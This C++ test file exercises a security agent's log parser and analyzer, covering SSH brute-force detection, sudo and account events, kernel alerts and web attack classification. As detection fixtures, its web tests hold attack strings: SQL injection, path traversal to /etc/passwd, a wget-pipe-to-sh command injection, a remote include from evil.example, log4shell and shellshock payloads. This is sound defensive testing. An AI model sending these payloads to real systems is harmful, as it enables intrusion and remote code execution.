#include <catch2/catch.hpp>

#include <algorithm>

#include "collectors/log_analyzer.h"
#include "collectors/log_parsers.h"

using namespace agent;

namespace {

AuthEvent auth(const std::string& line) {
  const auto sl = parseSyslogLine(line);
  REQUIRE(sl.has_value());
  const auto ev = parseAuthLine(*sl);
  REQUIRE(ev.has_value());
  return *ev;
}

std::vector<std::string> cats(const std::string& line) {
  const auto w = parseWebLine(line);
  REQUIRE(w.has_value());
  return classifyWebRequest(*w);
}

bool has(const std::vector<std::string>& v, const std::string& s) { return std::find(v.begin(), v.end(), s) != v.end(); }

const Observation* find(const std::vector<Observation>& v, const std::string& type, const std::string& key_part = "") {
  for (const auto& o : v) if (o.type == type && o.key.find(key_part) != std::string::npos) return &o;
  return nullptr;
}

bool tagged(const Observation* o, const std::string& t) { return o && has(o->tags, t); }

std::string webLine(const std::string& ip, const std::string& uri, int status = 200, const std::string& ua = "Mozilla/5.0") {
  return ip + " - - [22/Oct/2026:20:15:01 +0000] \"GET " + uri + " HTTP/1.1\" " + std::to_string(status) + " 512 \"-\" \"" + ua + "\"";
}

}  // namespace

TEST_CASE("syslog framing") {
  auto a = parseSyslogLine("Oct 22 20:15:01 web01 sshd[1234]: Failed password for root from 1.2.3.4 port 22 ssh2");
  REQUIRE(a);
  REQUIRE(a->host == "web01");
  REQUIRE(a->program == "sshd");
  REQUIRE(a->pid == 1234);
  REQUIRE(a->message.rfind("Failed password", 0) == 0);
  auto b = parseSyslogLine("Oct  2 04:05:06 h kernel: [ 1.5] text");  // space-padded day
  REQUIRE(b);
  REQUIRE(b->program == "kernel");
  auto c = parseSyslogLine("2026-10-22T20:15:01.123456+02:00 web01 sudo:   alice : TTY=pts/0 ; USER=root ; COMMAND=/bin/ls");
  REQUIRE(c);
  REQUIRE(c->program == "sudo");
  auto d = parseSyslogLine("2026-10-22T20:15:01+0200 web01 CRON[99]: (root) CMD (x)");
  REQUIRE(d);
  REQUIRE(d->pid == 99);
  REQUIRE_FALSE(parseSyslogLine("garbage"));
  REQUIRE_FALSE(parseSyslogLine(""));
  REQUIRE_FALSE(parseSyslogLine("Oct 22 20:15:01 web01 no colon here"));
}

TEST_CASE("ssh authentication lines") {
  auto f = auth("Oct 22 20:15:01 h sshd[1]: Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2");
  REQUIRE(f.kind == AuthEvent::Kind::LoginFail);
  REQUIRE(f.user == "admin");
  REQUIRE(f.src_ip == "203.0.113.9");
  REQUIRE(f.port == "51234");
  REQUIRE(f.method == "password");
  auto r = auth("Oct 22 20:15:01 h sshd[1]: Failed publickey for root from 2001:db8::1 port 22 ssh2");
  REQUIRE(r.src_ip == "2001:db8::1");
  REQUIRE(r.user == "root");

  auto i = auth("Oct 22 20:15:03 h sshd[1]: Invalid user test from 203.0.113.9 port 51236");
  REQUIRE(i.kind == AuthEvent::Kind::InvalidUser);
  REQUIRE(i.user == "test");
  auto ie = auth("Oct 22 20:15:03 h sshd[1]: Invalid user  from 203.0.113.9 port 51236");  // empty user name
  REQUIRE(ie.user.empty());

  auto ok = auth("Oct 22 20:15:04 h sshd[2]: Accepted publickey for deploy from 198.51.100.7 port 40022 ssh2: RSA SHA256:abc123");
  REQUIRE(ok.kind == AuthEvent::Kind::LoginOk);
  REQUIRE(ok.user == "deploy");
  REQUIRE(ok.method == "publickey");
  REQUIRE(ok.key == "RSA SHA256:abc123");
  auto okp = auth("Oct 22 20:15:05 h sshd[2]: Accepted password for root from 203.0.113.9 port 51240 ssh2");
  REQUIRE(okp.key.empty());

  REQUIRE(auth("Oct 22 20:19:05 h sshd[7]: Connection closed by authenticating user root 203.0.113.10 port 4444 [preauth]").kind == AuthEvent::Kind::PreauthClose);
  auto mx = auth("Oct 22 20:19:06 h sshd[7]: error: maximum authentication attempts exceeded for invalid user oracle from 203.0.113.11 port 1 ssh2 [preauth]");
  REQUIRE(mx.kind == AuthEvent::Kind::LoginFail);
  REQUIRE(mx.user == "oracle");
  REQUIRE(auth("Oct 22 20:19:00 h sshd[7]: Did not receive identification string from 198.51.100.99 port 1234").kind == AuthEvent::Kind::Scan);
  REQUIRE(auth("Oct 22 20:19:00 h sshd[7]: Unable to negotiate with 198.51.100.98 port 1234: no matching key exchange method found.").kind == AuthEvent::Kind::Scan);

  // noise must not become events
  const auto noise = parseSyslogLine("Oct 22 20:15:01 h sshd[1]: pam_unix(sshd:session): session opened for user bob by (uid=0)");
  REQUIRE(noise);
  REQUIRE_FALSE(parseAuthLine(*noise));
  const auto bad = parseSyslogLine("Oct 22 20:15:01 h sshd[1]: Failed password for root from not-an-ip port 22 ssh2");
  REQUIRE_FALSE(parseAuthLine(*bad));
}

TEST_CASE("sudo, su and account lines") {
  auto s = auth("Oct 22 20:16:00 h sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update");
  REQUIRE(s.kind == AuthEvent::Kind::Sudo);
  REQUIRE(s.user == "alice");
  REQUIRE(s.target_user == "root");
  REQUIRE(s.command == "/usr/bin/apt update");
  REQUIRE(s.pwd == "/home/alice");
  auto n = auth("Oct 22 20:16:10 h sudo:     bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash");
  REQUIRE(n.kind == AuthEvent::Kind::SudoFail);
  REQUIRE(n.detail == "not in sudoers");
  REQUIRE(auth("Oct 22 20:16:20 h sudo:   carol : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/ ; USER=root ; COMMAND=/bin/ls").detail == "incorrect password");
  REQUIRE(auth("Oct 22 20:16:30 h sudo:   dave : command not allowed ; TTY=pts/2 ; PWD=/ ; USER=root ; COMMAND=/bin/rm").detail == "command not allowed");

  auto su = auth("Oct 22 20:17:00 h su[555]: (to root) alice on pts/0");
  REQUIRE(su.kind == AuthEvent::Kind::SuOk);
  REQUIRE(su.user == "alice");
  REQUIRE(su.target_user == "root");
  auto suf = auth("Oct 22 20:17:05 h su[556]: FAILED SU (to root) bob on pts/1");
  REQUIRE(suf.kind == AuthEvent::Kind::SuFail);
  REQUIRE(suf.user == "bob");

  auto ua = auth("Oct 22 20:18:00 h useradd[600]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash");
  REQUIRE(ua.kind == AuthEvent::Kind::Account);
  REQUIRE(ua.name == "backdoor");
  REQUIRE(auth("Oct 22 20:18:10 h passwd[601]: pam_unix(passwd:chauthtok): password changed for backdoor").name == "backdoor");
  REQUIRE(auth("Oct 22 20:18:20 h userdel[602]: delete user 'olduser'").name == "olduser");
  REQUIRE(auth("Oct 22 20:18:21 h gpasswd[603]: user backdoor added by root to group sudo").action == "gpasswd");
}

TEST_CASE("kernel lines") {
  auto k = [](const std::string& msg) {
    const auto sl = parseSyslogLine("Oct 22 20:20:00 h kernel: " + msg);
    REQUIRE(sl);
    return parseKernelLine(*sl);
  };
  auto p = k("[12345.678901] device eth0 entered promiscuous mode");
  REQUIRE(p);
  REQUIRE(p->event == "promisc");
  REQUIRE(p->fields["iface"] == "eth0");
  auto sg = k("[1.0] nginx[2345]: segfault at 7f1234 ip 00007f1234 sp 00007ffc error 4 in libc.so.6[7f1000+1c0000]");
  REQUIRE(sg);
  REQUIRE(sg->fields["process"] == "nginx");
  REQUIRE(k("[1.0] Out of memory: Killed process 4321 (java) total-vm:1kB")->fields["process"] == "java");
  REQUIRE(k("TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.")->event == "syn_flood");
  REQUIRE(k("[1.0] nf_conntrack: table full, dropping packet")->event == "conntrack_full");
  REQUIRE(k("[1.0] evil: module verification failed: signature and/or required key missing - tainting kernel")->fields["module"] == "evil");
  REQUIRE(k("[1.0] audit: type=1400 audit(1.2:3): apparmor=\"DENIED\" operation=\"open\" profile=\"/usr/sbin/nginx\" name=\"/etc/shadow\"")->fields["profile"] == "\"/usr/sbin/nginx\"");
  REQUIRE_FALSE(k("[1.0] usb 1-1: new high-speed USB device number 5"));
  const auto other = parseSyslogLine("Oct 22 20:20:00 h sshd[1]: device eth0 entered promiscuous mode");
  REQUIRE_FALSE(parseKernelLine(*other));  // only the kernel can say it
}

TEST_CASE("web access lines and attack classification") {
  auto w = parseWebLine(webLine("203.0.113.9", "/index.php?id=1", 404, "Mozilla/5.0 (X11; Linux x86_64)"));
  REQUIRE(w);
  REQUIRE(w->ip == "203.0.113.9");
  REQUIRE(w->method == "GET");
  REQUIRE(w->uri == "/index.php?id=1");
  REQUIRE(w->status == 404);
  REQUIRE(w->bytes == 512);
  REQUIRE(w->ua == "Mozilla/5.0 (X11; Linux x86_64)");
  auto common = parseWebLine("10.0.0.5 - bob [22/Oct/2026:20:15:01 +0000] \"POST /login HTTP/1.1\" 302 -");
  REQUIRE(common);
  REQUIRE(common->user == "bob");
  REQUIRE(common->ua.empty());
  auto esc = parseWebLine("1.2.3.4 - - [22/Oct/2026:20:15:01 +0000] \"GET /a\\\"b HTTP/1.1\" 200 1 \"-\" \"ua\"");
  REQUIRE(esc);
  REQUIRE(esc->uri == "/a\"b");
  auto tls = parseWebLine("1.2.3.4 - - [22/Oct/2026:20:15:01 +0000] \"\\x16\\x03\\x01\" 400 150 \"-\" \"-\"");
  REQUIRE(tls);
  REQUIRE(tls->method.empty());
  REQUIRE_FALSE(parseWebLine("not a log line"));
  REQUIRE_FALSE(parseWebLine("1.2.3.4 - -"));
  REQUIRE_FALSE(parseWebLine("1.2.3.4 - - [x] \"GET / HTTP/1.1\""));

  REQUIRE(has(cats(webLine("1.1.1.1", "/index.php?id=1%27%20UNION%20SELECT%201,2,3--")), "sqli"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?id=1/**/UNION/**/ALL/**/SELECT/**/1")), "sqli"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?id=1%2527%2520or%25201=1")), "sqli"));  // double encoded
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?id=1;SELECT%20SLEEP(5)")), "sqli"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/../../etc/passwd")), "path_traversal"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/img?f=..%2f..%2fetc%2fpasswd")), "path_traversal"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?x=%3Bwget%20http://e/x.sh%7Csh")), "rce"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?cmd=$(id)")), "rce"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?page=php://filter/convert.base64-encode/resource=index")), "lfi_rfi"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/p?file=http://evil.example/shell.txt")), "lfi_rfi"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/?x=${jndi:ldap://evil/a}")), "log4shell"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/", 200, "${jndi:ldap://evil/a}")), "log4shell"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/cgi-bin/x.cgi", 200, "() { :; }; /bin/ls")), "shellshock"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/uploads/c99.php?cmd=id")), "webshell"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/", 200, "sqlmap/1.5.2#stable")), "scanner_ua"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/.env", 404)), "sensitive_probe"));
  REQUIRE(has(cats(webLine("1.1.1.1", "/.git/config", 404)), "sensitive_probe"));

  // ordinary traffic stays quiet
  for (const char* uri : {"/", "/index.html", "/products?id=42&sort=asc&page=3", "/search?q=select+a+good+book", "/api/v1/users/17", "/static/app.js?v=1.2.3",
                          "/blog/2026/10/how-to-union-your-data", "/download?file=report-2026.pdf", "/css/site.css", "/user/profile#section"}) {
    INFO(uri);
    REQUIRE(cats(webLine("10.0.0.1", uri)).empty());
  }
  REQUIRE(cats(webLine("10.0.0.1", "/", 200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36")).empty());

  REQUIRE(urlDecode("a%20b+c%zz%4") == "a b c%zz%4");
  REQUIRE(isPrivateIp("10.1.2.3"));
  REQUIRE(isPrivateIp("172.20.0.1"));
  REQUIRE_FALSE(isPrivateIp("172.32.0.1"));
  REQUIRE(isPrivateIp("192.168.1.1"));
  REQUIRE(isPrivateIp("::1"));
  REQUIRE(isPrivateIp("fe80::1"));
  REQUIRE_FALSE(isPrivateIp("203.0.113.9"));
  REQUIRE_FALSE(isPrivateIp("2001:db8::1"));
  REQUIRE(looksLikeIp("1.2.3.4"));
  REQUIRE(looksLikeIp("fe80::1"));
  REQUIRE_FALSE(looksLikeIp("hostname"));
  REQUIRE_FALSE(looksLikeIp("1.2.3"));
}

TEST_CASE("analyzer: brute force windows and the dangerous success") {
  LogAnalyzerOptions o;
  o.bruteforce_threshold = 8;
  LogAnalyzer an(o);
  std::vector<std::string> lines;
  for (int i = 0; i < 10; ++i) {
    lines.push_back("Oct 22 20:15:0" + std::to_string(i) + " h sshd[1]: Failed password for " + std::string(i % 2 ? "root" : "admin") + " from 203.0.113.9 port 5" + std::to_string(i) + " ssh2");
  }
  lines.push_back("Oct 22 20:15:20 h sshd[1]: Failed password for root from 198.51.100.5 port 22 ssh2");  // below the threshold
  an.feedAuth("/var/log/auth.log", lines, 1000);
  auto out = an.drain(1000);
  const auto* bf = find(out, "log.auth.bruteforce", "203.0.113.9");
  REQUIRE(bf);
  REQUIRE(bf->data["failures"] == 10);
  REQUIRE(bf->data["distinct_users"] == 2);
  REQUIRE(tagged(bf, "external_ip"));
  REQUIRE(tagged(bf, "root_targeted"));
  REQUIRE_FALSE(tagged(bf, "success_after_failures"));
  REQUIRE_FALSE(find(out, "log.auth.bruteforce", "198.51.100.5"));
  REQUIRE(bf->key == "bruteforce|203.0.113.9|1970-01-01");

  // window: failures older than 10 minutes do not add up
  an.feedAuth("f", {"Oct 22 20:30:00 h sshd[1]: Failed password for root from 198.51.100.5 port 22 ssh2"}, 1000 + 700);
  {
    const auto left = an.drain(1700);  // only the per-address activity record remains: no brute-force finding
    REQUIRE(std::none_of(left.begin(), left.end(), [](const Observation& o) { return o.type != "log.source"; }));
  }

  // nothing new => nothing re-emitted
  REQUIRE(an.drain(1710).empty());
  // a single new failure does not resurrect the expired window...
  an.feedAuth("f", {"Oct 22 20:31:00 h sshd[1]: Failed password for root from 203.0.113.9 port 22 ssh2"}, 1720);
  REQUIRE_FALSE(find(an.drain(1720), "log.auth.bruteforce", "203.0.113.9"));
  // ...but a renewed burst is reported again (deduplicated downstream by the daily key)
  std::vector<std::string> again(8, "Oct 22 20:31:05 h sshd[1]: Failed password for root from 203.0.113.9 port 22 ssh2");
  an.feedAuth("f", again, 1730);
  REQUIRE(find(an.drain(1730), "log.auth.bruteforce", "203.0.113.9"));

  // the worst case: it worked after several failures, even below the threshold
  LogAnalyzer an2(o);
  an2.feedAuth("f", {"Oct 22 20:15:00 h sshd[1]: Failed password for root from 203.0.113.50 port 1 ssh2",
                     "Oct 22 20:15:01 h sshd[1]: Failed password for root from 203.0.113.50 port 2 ssh2",
                     "Oct 22 20:15:02 h sshd[1]: Failed password for root from 203.0.113.50 port 3 ssh2",
                     "Oct 22 20:15:05 h sshd[2]: Accepted password for root from 203.0.113.50 port 4 ssh2"}, 5000);
  auto out2 = an2.drain(5000);
  const auto* bf2 = find(out2, "log.auth.bruteforce");
  REQUIRE(bf2);
  REQUIRE(tagged(bf2, "success_after_failures"));
  REQUIRE(bf2->data["success_user"] == "root");
  const auto* login = find(out2, "log.auth.login");
  REQUIRE(login);
  REQUIRE(tagged(login, "root_login"));
  REQUIRE(tagged(login, "password_login"));
  REQUIRE(tagged(login, "external_ip"));
}

TEST_CASE("analyzer: auth events") {
  LogAnalyzer an;
  an.feedAuth("/var/log/auth.log",
              {"Oct 22 20:15:04 h sshd[2]: Accepted publickey for deploy from 10.0.0.7 port 40022 ssh2: RSA SHA256:abc",
               "Oct 22 20:15:05 h sshd[2]: Accepted publickey for deploy from 10.0.0.7 port 40023 ssh2: RSA SHA256:abc",
               "Oct 22 20:16:00 h sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
               "Oct 22 20:16:10 h sudo:     bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/ls",
               "Oct 22 20:17:05 h su[556]: FAILED SU (to root) bob on pts/1",
               "Oct 22 20:18:00 h useradd[600]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash",
               "Oct 22 20:18:10 h passwd[601]: pam_unix(passwd:chauthtok): password changed for backdoor",
               "Oct 22 20:19:00 h sshd[7]: Did not receive identification string from 198.51.100.99 port 1234",
               "Oct 22 20:19:01 h sshd[7]: Did not receive identification string from 198.51.100.99 port 1235"},
              100);
  const auto out = an.drain(100);
  const auto* dl = find(out, "log.auth.login", "deploy");
  REQUIRE(dl);
  REQUIRE(dl->data["count"] == 2);                 // repeated events are folded into one observation
  REQUIRE_FALSE(tagged(dl, "external_ip"));         // private address
  REQUIRE(tagged(dl, "publickey_login"));
  const auto* sd = find(out, "log.auth.sudo", "alice");
  REQUIRE(sd);
  REQUIRE(tagged(sd, "sudo_to_root"));
  REQUIRE(tagged(sd, "sudo_shell"));
  REQUIRE(tagged(find(out, "log.auth.sudo_failure", "bob"), "not_in_sudoers"));
  REQUIRE(tagged(find(out, "log.auth.su", "bob"), "su_failed"));
  const auto* acc = find(out, "log.auth.account", "useradd");
  REQUIRE(acc);
  REQUIRE(tagged(acc, "account_created"));
  REQUIRE(tagged(find(out, "log.auth.account", "passwd"), "password_changed"));
  const auto* sc = find(out, "log.auth.scan");
  REQUIRE(sc);
  REQUIRE(sc->data["count"] == 2);
  REQUIRE(an.drain(101).empty());  // drained state is gone
}

TEST_CASE("analyzer: web attacks, scans and kernel events") {
  LogAnalyzerOptions o;
  o.web_scan_threshold = 40;
  LogAnalyzer an(o);
  std::vector<std::string> web;
  for (int i = 0; i < 3; ++i) web.push_back(webLine("203.0.113.9", "/index.php?id=1%27%20UNION%20SELECT%201,2,3--", i == 0 ? 200 : 403));
  web.push_back(webLine("203.0.113.9", "/../../etc/passwd", 404));
  web.push_back(webLine("198.51.100.7", "/uploads/c99.php?cmd=id", 200));
  web.push_back(webLine("10.0.0.5", "/ok", 200));
  for (int i = 0; i < 60; ++i) web.push_back(webLine("198.51.100.66", "/probe" + std::to_string(i), 404));
  an.feedWeb("/var/log/nginx/access.log", web, 200);
  an.feedKernel("/var/log/kern.log",
                {"Oct 22 20:20:00 h kernel: [12345.6] device eth0 entered promiscuous mode",
                 "Oct 22 20:20:01 h kernel: [12346.1] nginx[2345]: segfault at 7f ip 00007f sp 00007ffc error 4 in libc.so.6[7f1000+1c0000]",
                 "Oct 22 20:20:02 h kernel: [12347.1] nginx[2346]: segfault at 7f ip 00007f sp 00007ffc error 4 in libc.so.6[7f1000+1c0000]"},
                200);
  const auto out = an.drain(200);

  const auto* sqli = find(out, "log.web.attack", "203.0.113.9|sqli");
  REQUIRE(sqli);
  REQUIRE(sqli->data["count"] == 3);
  REQUIRE(sqli->data["success_responses"] == 1);
  REQUIRE(sqli->data["statuses"]["403"] == 2);
  REQUIRE(tagged(sqli, "web_sqli"));
  REQUIRE(tagged(sqli, "got_success_response"));
  REQUIRE(find(out, "log.web.attack", "203.0.113.9|path_traversal"));
  const auto* shell = find(out, "log.web.attack", "198.51.100.7|webshell");
  REQUIRE(shell);
  REQUIRE(shell->data["sample_uri"] == "/uploads/c99.php?cmd=id");
  REQUIRE_FALSE(find(out, "log.web.attack", "10.0.0.5"));

  const auto* scan = find(out, "log.web.scan", "198.51.100.66");
  REQUIRE(scan);
  REQUIRE(scan->data["errors_4xx"] == 60);
  REQUIRE(scan->data["distinct_paths"] == 60);
  REQUIRE_FALSE(find(out, "log.web.scan", "203.0.113.9"));  // 2 errors only

  REQUIRE(tagged(find(out, "log.kernel", "promisc"), "promiscuous_mode"));
  const auto* seg = find(out, "log.kernel", "segfault");
  REQUIRE(seg);
  REQUIRE(seg->data["count"] == 2);  // same process object folded together

  // cap per cycle
  LogAnalyzerOptions small;
  small.max_observations = 2;
  LogAnalyzer capped(small);
  std::vector<std::string> many;
  for (int i = 0; i < 6; ++i) many.push_back("Oct 22 20:16:0" + std::to_string(i) + " h sudo:   u" + std::to_string(i) + " : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls");
  capped.feedAuth("f", many, 1);
  std::vector<std::string> warnings;
  REQUIRE(capped.drain(1, &warnings).size() == 2);
  REQUIRE(warnings.size() == 1);
}

// The acceptance guide (USAGE.md, section 14.4) injects events with `logger -t <program> "<message>"`: the tag carries
// no PID, and Ubuntu's rsyslog writes ISO timestamps with microseconds. Both framings must work end to end.
TEST_CASE("events written by logger(1) are understood, with and without PID and in both timestamp styles") {
  for (const char* style : {"Oct 22 22:40:01 host ", "2026-10-22T22:40:01.123456+02:00 host "}) {
    INFO(style);
    LogAnalyzer an;
    std::vector<std::string> lines;
    for (int i = 1; i <= 10; ++i) lines.push_back(std::string(style) + "sshd: Failed password for root from 203.0.113.50 port 4000" + std::to_string(i % 10) + " ssh2");
    lines.push_back(std::string(style) + "sshd: Accepted password for root from 203.0.113.50 port 50000 ssh2");
    lines.push_back(std::string(style) + "useradd: new user: name=testx, UID=1999, GID=1999, home=/home/testx, shell=/bin/bash");
    lines.push_back(std::string(style) + "sudo:   alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash");
    an.feedAuth("/var/log/auth.log", lines, 100);
    const auto out = an.drain(100);
    const auto* bf = find(out, "log.auth.bruteforce", "203.0.113.50");
    REQUIRE(bf);
    REQUIRE(bf->data["failures"] == 10);
    REQUIRE(tagged(bf, "success_after_failures"));
    REQUIRE(tagged(find(out, "log.auth.login", "root"), "root_login"));
    REQUIRE(tagged(find(out, "log.auth.account", "useradd"), "account_created"));
    REQUIRE(find(out, "log.auth.sudo", "alice"));
  }
  // and the journald framing (short-iso) with the PID of the logger process
  LogAnalyzer an;
  an.feedAuth("journal", {"2026-10-22T22:40:01+0200 host sshd[4242]: Failed password for invalid user admin from 203.0.113.50 port 1 ssh2"}, 1);
  {
    const auto left = an.drain(1);  // one failure is not an attack: only the map's activity record, no event
    REQUIRE(std::none_of(left.begin(), left.end(), [](const Observation& o) { return o.type != "log.source"; }));
  }
}

TEST_CASE("every address that touches the machine is tracked, even below the alert thresholds") {
  LogAnalyzer an;
  an.feedAuth("f", {"Oct 22 20:30:00 h sshd[1]: Failed password for invalid user admin from 198.51.100.5 port 22 ssh2",
                    "Oct 22 20:30:02 h sshd[1]: Failed password for root from 198.51.100.5 port 22 ssh2",
                    "Oct 22 20:31:00 h sshd[2]: Accepted password for kashim from 192.168.1.19 port 5555 ssh2"}, 1000);
  const auto obs = an.drain(1000);
  const Observation* ext = nullptr;
  const Observation* lan = nullptr;
  for (const auto& o : obs) {
    if (o.type != "log.source") continue;
    if (o.data["src_ip"] == "198.51.100.5") ext = &o;
    if (o.data["src_ip"] == "192.168.1.19") lan = &o;
  }
  REQUIRE(ext != nullptr);
  REQUIRE(ext->data["ssh_fail"] == 2);
  REQUIRE(ext->data["users"].size() == 2);
  REQUIRE(lan != nullptr);
  REQUIRE(lan->data["ssh_ok"] == 1);
  // deltas: a second drain with no new lines reports nothing, so nothing is ever counted twice
  const auto again = an.drain(1001);
  REQUIRE(std::none_of(again.begin(), again.end(), [](const Observation& o) { return o.type == "log.source"; }));
}
